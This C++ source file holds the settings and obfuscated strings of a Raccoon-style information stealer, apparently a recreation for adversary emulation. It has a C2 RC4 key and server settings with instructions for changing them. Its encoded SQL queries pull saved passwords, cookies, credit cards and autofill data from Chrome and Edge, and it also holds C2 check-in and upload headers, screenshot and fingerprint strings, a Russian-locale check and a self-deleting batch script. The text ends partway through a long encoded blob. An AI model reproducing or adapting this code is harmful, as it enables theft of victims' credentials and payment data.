#include "vars.h"

// VARS YOU WANT TO CHANGE
const wchar_t g_C2RC4Key[] = L"f37bd60d60c815dbd2b8a141de515d94"; // This is the key for C2 server decryption
wstring g_localLowPath = L"Yn/qsh9HOA=="; // Raccoon uses local low, placeholder var for c:\temp
wstring g_stagingFolder = L"fXeG1Ekafg=="; // Folder name to stage files. Currently 202306
wstring g_server = L"TSrVhxZCJ4aH"; // Change this - localhost is the default -> (L"TSrVhxZCJ4aH")
int g_port = 80;
wstring g_token = L"USnXhR9CJ5mXdm4="; // "placeholder"

// VAR YOU CAN CHANGE BUT WILL INVOLVE WORK
const char g_StrRC4Key[] = "arstarstarstarst"; // This is the key for string decrytion INTERNALLY, not C2
											   // You'll need to RC4->B64 every string again if you change this

// VARS YOU DON'T WANT TO TOUCH //
// File search options
const int PATH = 0;
const int FILTER = 1;
const int EXCLUSIONS = 2;
const int MAX_FILE_SIZE = 3;
const int RECURSE = 4;

// Some single character strings
wstring g_spaceChar = L"AQ=="; // L" "
wstring g_leftParen = L"CQ=="; // L"("
wstring g_rightParen = L"CA=="; // L")"
wstring g_newLineChar = L"Kw=="; // L"\n"
wstring g_backSlash = L"fQ=="; // L"\\"
wstring g_forwardSlash = L"Dg=="; // L"/"
wstring g_quote = L"Aw=="; // L"\""
wstring g_asterisk = L"Cw=="; // L'*'
wstring g_asteriskWithSlash = L"fW8="; // L"\\\*"
wstring g_dot = L"Dw=="; // L"."
wstring g_doubleDot = L"D2s="; // L".."
wstring g_pipe = L"XQ=="; // L"|";
wstring g_dash = L"DA=="; // L"-"
wstring g_comma = L"DQ=="; // L","

// System Privs check
wstring g_sid = L"cmiHy08Hec0="; //L"S-1-5-18";

// Browser dump
wstring g_defaultWebData = L"ZSDQhw9GPKmkdn4SetsztQ=="; //L"Default\\Web Data";
wstring g_webdata = L"fRLThD5LPJQ="; //L"\\WebData";
wstring g_defaultLoginData = L"ZSDQhw9GPKm/fHtbUJoDtdUo"; //L"Default\\Login Data";
wstring g_LoginData = L"fQnZgRNEDJSHcg=="; //L"\\LoginData";
wstring g_defaultNetworkCookies = L"ZSDQhw9GPKm9dmhFUcgsiOImzccD2Gg="; //L"Default\\Network\\Cookies";
wstring g_cookies = L"fQbZiRFDLYY="; //L"\\Cookies";
wstring g_sqlite3_column_blob = L"UjTajw5Pe6qQfHBHU9QYts0mwA=="; // L"sqlite3_column_blob";
wstring g_sqlite3_open = L"UjTajw5Pe6qcY3lc"; // L"sqlite3_open";
wstring g_sqlite3_prepare_v2 = L"UjTajw5Pe6qDYXlCX8gii9d7"; // L"sqlite3_prepare_v2";
wstring g_sqlite3_finalize = L"UjTajw5Pe6qVenJTUtM9sQ=="; // L"sqlite3_finalize";
wstring g_sqlite3_close = L"UjTajw5Pe6qQf3NBWw=="; // L"sqlite3_close";
wstring g_sqlite3_step = L"UjTajw5Pe6qAZ3lC"; // L"sqlite3_step";
wstring g_sqlite3_column_bytes = L"UjTajw5Pe6qQfHBHU9QYttg9x98="; // L"sqlite3_column_bytes";
wstring g_sqlite3_column_text = L"UjTajw5Pe6qQfHBHU9QYoMQx1g=="; // L"sqlite3_column_text";
wstring g_sqlite3_errmsg = L"UjTajw5Pe6qWYW5fTd0="; // L"sqlite3_errmsg";
wstring g_localState = L"bSrVhxYKG4GSZ3k="; // L"Local State";
wstring g_encrypted_key = L"RCvVlANaPJCXTHdXRw=="; // L"encrypted_key";
wstring g_select_from_logins = L"cgD6ozl+aJqBentbUOUyps1lgtkZ2GlAeeHgAJWjgwZ7KlNXJeLujjsbK69EOokYY4F69eJb0OgghVQMuw=="; // L"SELECT origin_url, username_value, password_value FROM logins";
wstring g_looted_logins = L"bSrZkh9OaLmcdHVcTYBN"; // L"Looted Logins : \n";
wstring g_append_url = L"AWWWxi94BM/T"; // L"    URL: ";
wstring g_append_username = L"DWXjlR9YJpSediYS"; // L", Username: ";
wstring g_append_password = L"DWXmhwlZP5qBdyY="; // L", Password:";
wstring g_select_from_cookies = L"cgD6ozl+aJ2cYGhtVd8++IEnw8EPkTtLdu/3JpO2ihdBcBJLMfS9vwYmAtBRNIoGb8RPnA=="; // L"SELECT host_key, name, encrypted_value FROM cookies;";
wstring g_looted_cookies = L"bSrZkh9OaLacfHdbW8l93g=="; // L"Looted Cookies:\n";
wstring g_append_hostkey = L"AWWWxjJFO4G4dmUIHg=="; // L"    HostKey: ";
wstring g_append_name = L"DWX4hxdPctU="; // L", Name: ";
wstring g_append_value = L"DWXghxZfLc/T"; // L", Value: ";
wstring g_select_from_credit_cards = L"cgD6ozl+aJuSfnltUdQYt8A7xoBK2GNecf7kK4qtgSxzaR1TLL29nCwZJoJTL4wCaP5Fwsxk3KQsg08Gl6VsSSfvWkvbpM0yi8wSiGo9s344NJvWDp+W1MQub2eeMFt3"; // L"SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;";
wstring g_append_name_2 = L"AWWWxjRLJZDJMw=="; // L"    Name: ";
wstring g_append_expiration = L"DWXzngpDOpSHenNcBJo="; // L", Expiration: ";
wstring g_append_cc = L"DWX1pVkQaA==";// L", CC#: ";
wstring g_select_from_autofill = L"cgD6ozl+aJuSfnkeHswmuNQsguo48lYOefnxMIWrgx8l"; // L"SELECT name, value FROM autofill;";
wstring g_looted_ccs = L"bSrZkh9OaLawYCY4"; // L"Looted CCs:\n";
wstring g_looted_autofill = L"bSrZkh9OaLSGZ3NUV9Yr7qs="; // L"Looted Autofill:\n";
wstring g_sqlitedll = L"fTbHihNeLcbdd3Be"; // L"\\sqlite3.dll";
wstring g_google_chrome_user_data = L"fQLZiR1GLamwe25dU98bgdIs0Iwu3G9PRA=="; // L"\\Google\\Chrome\\User Data\\";
wstring g_chrome = L"DGibpRJYJ5iWPjEfNA=="; // L"---Chrome---\n";
wstring g_microsoft_edge_user_data = L"fQjfhQhFO5qVZ0B3Wt0iiPQ6x95K+XpaedA="; // L"\\Microsoft\\Edge\\User Data\\";
wstring g_edge = L"DGibox5NLdjePhY="; // L"---Edge---\n";
wstring g_browser_theft = L"YzfZkQlPOqGbdnpGEM4/oA=="; // L"BrowserTheft.txt";

// File up/download
wstring g_content_disposition = L"YirYkh9EPNi3em9CUckuoMgmzJZK23RcdaHhPpej1FNwZx5CebP7kDgMbcsSPYwBY89dysgr0g=="; // L"Content-Disposition: form-data; name=\"file\"; filename=\"";
wstring g_content_type = L"YirYkh9EPNinamxXBJompNEly88LyXJBdqP9coyghRZ9cnk="; // L"Content-Type: application/x-object\n";
wstring g_content_type_2 = L"YirYkh9EPNinamxXBJoqoc09y9wLz28BfuP3Ms6mjgd/PVNFK+TznTUbNs0Q"; // L"Content-Type: multipart/form-data; boundary=\"";
wstring g_cache_control = L"KwbXhRJPZbacfWhAUdZ99M8mj88L3nNL"; // L"\nCache-Control: no-cache";
wstring g_POST = L"cQrlsg=="; // L"POST";
wstring g_recieved = L"UyDVjx9cLZE="; // L"recieved";
wstring g_GET = L"ZgDi"; // L"GET";
wstring g_userAgent = L"QDfFkihLK5acfHJTTMkz"; // L"arstRaccoonarst"
wstring g_doubleDash = L"DGg="; // L"--"

// Initial checks and checkin
wstring g_mutexValue = L"GXKE0kwee8XGIQ=="; // L"8724643052" -- hardcoded mutex value
wstring g_ru_lang = L"UzCblA8="; // L"ru-ru";
wstring g_checkin_machineID = L"TCTVjhNELbyXLg=="; // L"machineId=";
wstring g_checkin_configID = L"BybZiBxDL7yXLg=="; // L"&configId=";
wstring g_checkin_headers = L"YirYkh9EPNinamxXBJompNEly88LyXJBdqP9cpS1whVxdB4KMePxnDoKIJRXP95NZcld1d5zhLk6lltP8MFaRSbiTTn9pcA0gNMK1y5zmgEUGNjdGQ=="; // L"Content-Type: application/x-ww-form-urlencoded; charset=utf-8\nCache-Control: no-cache";
wstring g_reg_open_Cryptography = L"cgrwsi1rGrCvXnVRTNU0u8c9/u8YxGtad+v3PpOqlg=="; // L"SOFTWARE\\Microsoft\\Cryptography";
wstring g_reg_query_MachineGUID = L"bCTVjhNELbKGeng="; // L"MachineGuid";

// Config parsing
wstring g_config_libs_regex = L"TSzUlSUEYtE="; // L"libs_.*$";
wstring g_config_grbr_regex = L"RjfUlCUEYtE="; // L"grbr_.*$";
wstring g_config_scrnsht_regex = L"UibEiAlCPKrdOTg="; // L"scrnsht_.*$";
wstring g_config_token_regex = L"VSrdgxQQZt/X"; // L"token:.*$";
wstring g_config_libs = L"TSzUlQ=="; // L"libs";
wstring g_config_grbr = L"RjfUlA=="; // L"grbr";
wstring g_config_scrnsht = L"UibEiAlCPA=="; // L"scrnsht";
wstring g_config_token = L"VSrdgxQ=";// L"token";
wstring g_folderShortcutParser = L"BBnBzV8="; // L"%\\w+%"
wstring g_userProfile = L"dBbztCp4B7O6X1k="; // L"USERPROFILE"
wstring g_publicPath = L"Yn/qkwlPOoavY2lQUtMk"; // L"C:\\users\\public"

// Cleanup actions
wstring g_clsid = L"WnCD0RlMfMXCPi1TDo5q5ZAtkYFT3CwdNby1b9Ok10J7YEAVIew="; // L"{557cf401-1a04-11d3-9a73-0000f81ef32e}";
wstring g_hastalavista = L"fS3XlQ5LJJSFem9GX5QltdU="; // L"\\hastalavista.bat";
wstring g_recyclebin = L"Yn/qwihPK4yQf3kcfNMpiA=="; // L"C:\\$Recycle.Bin\\";
wstring g_exe = L"fW+YgwJP"; // L"\\*.exe";

// Terminating BAT file contents
wstring g_batPartOne = L"YQD1rjUKB7O1GSZgW8oitdVDgoxKnW9HdenqKpfiwAc+NFMZKuTx83RJb9BWPolN"; // L"@ECHO OFF\n:Repeat\n\ttimeout /t 2 >nul\n\tdel ";
wstring g_batPartTwo = L"AXeIiA9GQtXTMzxbWJoirMg61ow="; // L" 2>nul\n\tif exist ";
wstring g_batPartThree = L"ASLZkhUKGpCDdn1GNM4uucQm19hKkm8OKay7MZau5Rd7alM=";  // L" goto Repeat\ntimeout /t 1 >nul\ndel ";
wstring g_batPartFour = L"KyHTiloIbYuVIz4="; // L"\ndel \"%~f0\""

// Screenshot
wstring g_ScreenshotPath = L"fRbVlB9PJoabfGgcVMoisw=="; // L"\\Screenshot.jpeg"
wstring g_screenshotUploadName = L"DGibtRlYLZCdYHRdSpQtpMQu"; // L"---Screenshot.jpeg"

// Fingerprint
wstring g_systemInfoFilePath = L"fRbPlQ5PJdW6fXpdEM4/oA=="; // L"\\System Info.txt";
wstring g_systemInfoUploadName = L"cjzFkh9HaLyddXMcSsIz"; // L"System Info.txt";
wstring g_xChar = L"WQ=="; // L"x"
wstring g_x86 = L"WX2A"; // L"x86"
wstring g_x64 = L"WXOC"; // L"x64"
wstring g_MB = L"bAc="; // L"MB"
wstring g_unknownLiteral = L"dCvdiBVdJg=="; // L"Unknown"
wstring g_osError = L"bhaWqBVeaLqRZ31bUN8j"; // L"OS Not Obtained"
wstring g_regCurrentVersion = L"cgrwsi1rGrCvXnVRTNU0u8c9/vsD039Bb/+lEbeerAZsdBZJMMf4iycAIJ4="; // L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
wstring g_productNameKey = L"cTfZgg9JPLuSfnk="; // L"ProductName"
wstring g_processorError = L"dCvXhBZPaIGcM3NQStsuuoE50MMJ2Ghdd/6lNo2kgA=="; // L"Unable to obtain processor info"
wstring g_coresWithParen = L"YirEgwkD"; // L"Cores)"
wstring g_localeError = L"dCvXhBZPaIGcM3NQStsuuoElzc8L0X4="; //L"Unable to obtain locale"
wstring g_regUninstall = L"cgrwsi1rGrCvXnVRTNU0u8c9/vsD039Bb//ZHJawnRZwciVCNuL0ljo1Gp5bNZYZZ81Q"; // L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
wstring g_displayNameKey = L"ZSzFlhZLMbuSfnk="; // L"DisplayName"
wstring g_displayVersionKey = L"ZSzFlhZLMaOWYW9bUdQ="; // L"DisplayVersion"

// system information block for formatting
wstring g_indent = L"AWWWxlcK"; // L"    - "
wstring g_indent2 = L"AWWWxloKaNU="; // L"        "
wstring g_systemInfoFormat = L"cjzFkh9HaLyddXNAU9szvc4nmA=="; // L"System Information:"
wstring g_localeFormat = L"bSrVhxZPctU="; // L"\nLocale: "
wstring g_timeZoneFormat = L"dSzbg1pQJ5uWKTw="; // L"\nTime zone: "
wstring g_archFormat = L"YDfVjhNeLZaHZm5XBJo="; // L"\nArchitecture: "
wstring g_cpuFormat = L"YhXj3Fo="; // L"\nCPU: "
wstring g_ramFormat = L"cwT73Fo="; // L"\nRAM: "
wstring g_displaySizeFormat = L"ZSzFlhZLMdWAemZXBJo="; // L"Display size: "
wstring g_displayDevicesFormat = L"ZSzFlhZLMdW3dmpbXd807g=="; // L"Display Devices:\n"
wstring g_installedAppsFormat = L"aCvFkhtGJJCXM31CTtYut8A9y8MEziE="; // L"Installed applications:"

// Fake BrowserTheftData
wstring g_browserTheft = L"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"
						 L"opTuKL6AcuqFt / U5xJQpv33698Tw33PBDEsR1jsx + RPUWPaLiEQYzqOqga7vnYrvhmofHzbs7 + NXFJBCFd35t + AkOcup3GI / fODRkoKZbvamtj5K8ADMAxU / ZfG / AclAayaeVLCi2sxH1lwHG2s + 3zzUOv3RUCRQ1Yv9clw7RSI8IL9vihBXaM4KoAof1TE + 5VCPdtve / 8qhEoeAoaysK0E5koV6ozEX7yBDHUFKicbTX45u6temf78Wk4DY / C9h5c1Rfq9squdgPB546wNPdVtRip71LvlWEZ / YpEM3ndvOwjPmeXLF5FoxLphtrefAhfZV82JOa1U4B97zMRJcGdC50H0m + nqdLwPcN1U2SwdQPlbSTcqWqI2 / h0IhC8GWXFzLvOizGuo6YV5cHWXnOtJpzSUia0HRr12aUwwzALvFdI1EAJ9Zt9x2s9NRJBdLS4RZ / oOzKyilcO3FmTwFUODpH1bEWEvHcktDhe6DHX9Rf / ojrnTkfnB4BV + rUhjStUjaBMY8uASEycvZuOAD4kr1xnVvzuLi5aLzFbESxLwLmYzFxQ9TaaA39nTSNUHBjQB9R + 0cZunsfVB1v + b6eeH3MsuslNiCa0jL8P2FSzfVKyQEbV / ZedVz4ryhhdvf8WIE / 8uMygLKBRyJCiHvdLGTgniB4d5cYUJIKd8yot2DL44MUjdWCdKtCUTdlWXo9IRhgtPlbhhFDyKN60YiK2aKLleFsZjoFucz0NqIuOAk3ixcAi0Aezh1 + 1yz67v3NwZZEXNAr + kOGs5Gb3QL27m69ky2BJYbrLmUKPLwjy4DNitIQb3o7 / PcfZfqe0FHlJqlGjRq3m5lmMnwNYmtvVj + c + / XpesxaUDSEema1r + vOdq + D4yN35UYUFXLnWs5t0gFjUZTqXjUoQzG4Ok1r3lJgudqlWVSanjp + pCZuQK4SC0OW2zUEtN2cAjxR1sWocmFIo6QkUwcAtNzNT5aLuXMPYvkKkU4GvjR4cZpBwMT7DM0 + gZdSFFW3rmacZbXoWwCb2rzI5ww0azBOOcT + FzBDlJZUpn + YocNnoHEelzHXjjV98HsMytzA4DvlNrh0uIRpxFLxswhOpNDd0UuQEBSFGH0r6eI5Da8g4V7f1M2eif8YrW3pLDU / rTkxUoMTvmEMGpvTWBMgA3aCv2ayJKtvDsYMw4cGTWwtw8RzI9jTyW / lBux3SjqJ7EDiwPEpG7OA061bbadvH / Ljp78SloZrT5GX5EyIJr4bntwer / ZxyHhXV7ytATRoul / CrbPnQ7u4T5y4OOkeGOae / Ez0tFD6bnm0yEh5sUzWCKrXfia + IwvywU9vmT2F4GG35n4nT / blY8XK0W5trT0U4MLKjNwQzk8qqQFL8fNdd4F6ZPrFXkYQs8f79zgj5fBR1DlMXmVlMIlfTv / 2mU0BceM9e6sAoIuiZcBr42LacihxCYqpsioIAh3SGGYle + KvA117 / BAAPvO / T1f3gMfWYwHRLvki3OEC7Bk6iRpXrhobzrfYbFeKV7qLw4AObcD / 64sghQ8w + Qqc2 / Knto / 86NxN / KulKm + X7oYFIiyl0ld0U2Dk / xAn2r3sQqxqnLAB3oSF6JrevixvgjwPPHjzqr81MfT99tJGuVPlX94R0o93HSJqMmU2 / w5bWtkpsEGMAFuXzV5MzdTe2jAro / tJoVikqx7SR3F10I + aY12o9M4PbfyWSPFwDtJ0qUy174a + 9TNife61k / gHofyyXn8Od0skyz5tfJtX2gMY6cHtWBo2qETe0wVHf0Z0ADvgkRYpU + 6G9 / 0LHZeFRhq8H8cbyty3WbJgswEaJfNHEwJuooChqmUgtTpCl7pTHdXs0nECkwChFvJOH2n / s0geAAPk + dkqPUaqqOTuS0MtMqzz4xLpTo + eWz + bIpeJ1TXST4ABE4SmPKpm30tedurgFBH1AWkCzs3QggzhjV85zVxuQ9ENecJ + DALqIwpAZVaVvkTDcHaKGnaq7OEurVQjf8 + WD3M7OZO3H / xdbbFBWXUi9pEO4y / kxVwqsw47vnpApv3ytOo//m3uNwEOYLiFjmhXzxZO+5i5dFzNChUsZJUbPsOn0Wg+fZB8wmHr1SNMKqy1Xptn4sxlFCFrmg6WA0RNorD4vFX9x6KZ6JQEMmZPYr4rJjZX78ZvkpDF0MY7wEd9VlZqzjWjcQUwbfLSd7+SG28+XG7OcRjQRZ1m+LYOcY9S0mag7HbjOStAk4cXcJl9QaWGN6Dbw3vDi3FlTaGAVcTFBe2GV3qIiVy3nfuzV8fqb2C2QmHs79WMKGBDN1VboG6JOiNPLW01O1ibNos1BFMvePm0AKjbDVGUHLz6kYVgWHg/C1L6spKB3QpcULCQQKoq3EuLTwv/hWzGgp8BGjslhUVCoyxsdBPvu8aktCplbCGo1WLVneauGhI2v1sI6NZolvCmbeMYM0omNwJxh27MjZLLyuV4JEHUdiTiGeGAFS528U8p7Fcbx9MHy1QTb+bR/4kYowl26ArFx8IGbD1cTR8h/WWW+HEXoko+QbUONTKmxujkcrB+2xskHBdPtepIdZ0FaJeCFTCTqmpnc1fvPla0UE9EBArhrWYtAlbDHux9YSFAe5oFOSjDr4yY3FIdQqs86RkAS1Rmfu3W1YYOAGoEjx4Zfl4oUmRakERgfz+nkTmNWbcMyRrS0WkmfG6nYDB25G7CXWb2iBIiX9jw/HD+7ELm7NrOtf8pH4thIv0ZrsvbgKlFAaF8QSkDmzj3i5fG93fYxFTE6PQF8Woyvf+LS1+ovHjChKAr23FRQfLRroD/YKiK52YvI3CPcLPbwBH/HFd6AlC6CewB9qmwaAlVzgxMhRBzDvz/I52yzecwK6W4ksSmkywQDVd+yAoHjxzT178hwu5UB2dpiP90twyfUEcnp4Anl3454FO970daySdLuN5C+rrMfdyV9wJ99B39pYlh88cWbgqZbRZxRWWlx3PQ8Q8aD9v1HSRNNKVM1hZMfPL+sCjqESIUY46fVd2sqUIdlvzBhjuBsUmzXLnt0Ws41n+granW/Z6LgndQTf63t71yZSJhrrc/qWFE7Sr18AUAWjy5N3bZEiigPRsnnAKFlovCfvF621iT4xbWD6GKPFX+CV3FsSF0wAAqhvyLmpvD6vgBMZDHH8p7JawSZMjqWHLhjRE9SkSLpUSjhi8xPOdl+i1yKsbG1GG7YUpEkIfc/vKx1v9ySAhy9XGFU/NJqw+n1nqx69pjQyXIa1iGrRcCr3UMN3FkP2NwZQSbSrgZ2mXvs+DM4qIZJsqOCIHCN5J7xG5iuMnMzjYPgy5u3uHLNlTbEWmEz4KdMgNKmFII+wQp1VT5UDxyvropfgI2LbaTAoyRMl0AIYODOCHjtiIe6ucBTSTDkj9cy0YCnLbWPMCRiAL4jYDIsRUL3xaL6k9jcUa1DUEC723CZsu6EK5aF+brxZWscKr/cjQK2tMrbDh5seGUsIremUnEpnauK/SQWZUzuxQyOfy5L+jdcNHNjA5Q41KLAJ4A6Fwyrn+8kgGIGDcm+8oY7prPfarycQ0FpH+n2B3TsDDCYJz09PxiSDhYoPZqdPjpSkIjbqCbffFfxbCPlpaWqMo/O+v0nFFLZAqE8hf6U3fuiTDTm64mOR9+rmoYW0HVB9jv224MJDLYBSphCg4V38+TFfWnYV40VLCFz24gxrFYMJ"
						 L"wqLSWcgULBRwv76jPVfoYUFbnpA0XyrbdR8VQF7tZq5M4uc3QDacQE04H2r + f11gjOZklTjYpUCkRRfmnrd9tqZfTSgXjEI / Y / pkChW / M4Rcl46QyRyJzAR75VuhA7rO + CXkmWrJks98mWX + SkXexSunMKlKbl5546APRQO48B2mtPBTJmgw2DIxd05vqYvHrB3jt5NCLUqP7YUzaNxhEZ5HOo5PzrRPeiCif26FQLnG + F2b7qC0EaEs3E7ucyzRd0x5iXdH1sTq750sm4r9E0jw9et3X7P0KOAXicDem7D0UAGI9rG4W9hY5 + ugCwbPGNqScIlQo43cDgBdEdc + 5B620gCJRPlYk6KiVZoEPLpE / sfhwE6rReZm5XJJmbG + eBr5xNiNyPD291TK8DFOn2NVmpG9qx2IhzuEtXkbZKLfF3py2F7weLBrpmFLOIJAMsVQNGmeSMOKyAcumP91orup7d6pkSbrbiwSLSWYl9 / Si4jJqLT0j6ngD2z23hwhw / +PQoOc63BTy9m0FY05aNDtPT426UrfF6Shhi + fPh85jdhqw1 / w3cGVptEsQll11VQlOJXgelvkWMATr / g7 + / 4NeLJO3sLY6GjseoxCSDo / jOc2DmM1MwLi9BpngFBaQNvaGvVWQ8OdS5liWIkZqI / lZn9OwXDxYh7j + SWaUPzKXU1w7OZXl23ITRZ5LgLmoDDPy2 + I2 + 72HbwSmNb3uqHuL6cpEzdJvGZIs + AjxZM9N9lM09erKUMGsDIPbHFAA8I / L99oy07rjtzyaEKLfrKTg7AjEVGxFCu1SzWJiDeHiWxUJjJzL7indqhOG5tOhyZs8l8FicgqLuMp8ljSH5w8dsqO8QWXRtI3qsdgzgQH + qiYW3VIaXmanEBz80wMEu5bHLF26KCzvQQg + 0FIgBs8QNS / 5xI9cHBUbsKX5qlvQ7oQPAOF89gE0BflvOp8GEZQw51mDShTffZFadMXpbha0 + ZCXU7drBKLpzwStPYa3RT / HpFDcK9J80HGHIadHcnZwqzIkD91F / 7nrX0QeCXcGrq8GmCzZvXB4xKWquRY8WFvcuYyUNfsSOFKbSq6r24dU + C2oaZSAl6OOzkUvYcmI + K868utQtaDp1LYHq52ZwcJbJ4zTbKyHMkzncsE6OejD0i6DNQszhaD9cH + Vql1xso + TiqcrRhxz7GK3ZPx + 0JNH2wiJq5Bi6ZQQkALKyKmU8qm5vG5gKpf18hIe47JPLK3qBYWkKUeffHG6N + LYVMApWNfJ8Y87MqC2wtVVkD + g30ANy / 9PE++OLSVHBXJ0BZUMnJnIW1rDszKU87SZf8iaNc8gFegv / 29 + G7Cbgqhi4qcecaupqB35YahEB + D4D9ndHl9b7eLQZNy8c / Z11ywlRYFzBJWZO / 5JxPsLE0c / i4X7eYbIT3c0LS / 